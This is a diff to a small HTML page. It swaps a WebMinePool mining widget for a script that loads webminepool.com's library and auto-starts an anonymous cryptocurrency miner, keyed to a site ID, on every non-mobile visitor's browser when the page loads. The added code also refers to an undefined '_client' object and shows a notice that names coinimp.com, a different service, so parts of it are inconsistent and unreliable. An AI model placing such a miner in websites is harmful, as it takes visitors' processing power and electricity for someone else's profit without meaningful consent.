@@ -13,29 +13,34 @@
 </head>
 
 <body>
-  
-  <h1>Startong.</h1>
-  
+
+    <h1>Mining...</h1>
+
 </body>
-  
-  <script src="https://webminepool.com/lib/simple-ui.js"></script>
 
-<div id="wmp-container"
+ 
 
-    wmp-site-key="<SK_MMgT8VQDSrSAMk4M2Ej5l>"
+<script src="https://webminepool.com/lib/base.js"></script>
 
-    wmp-username="<ElLobito>"
+ 
 
-    wmp-threads="4"
+<script>
 
-    wmp-throttle="0.1"
+ 
 
-    wmp-autostart="true"
+    var miner = WMP.Anonymous('<SK_MMgT8VQDSrSAMk4M2Ej5l>',{throttle: 0.3});
+    
+    if (!miner.isMobile()){
 
-    style="margin: 0 auto;"
+        miner.start();
 
->
+    }
+ 
+    _client.start();
 
-</div>
+
+    _client.addMiningNotification("Floating Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+
+</script>
 
 </html>
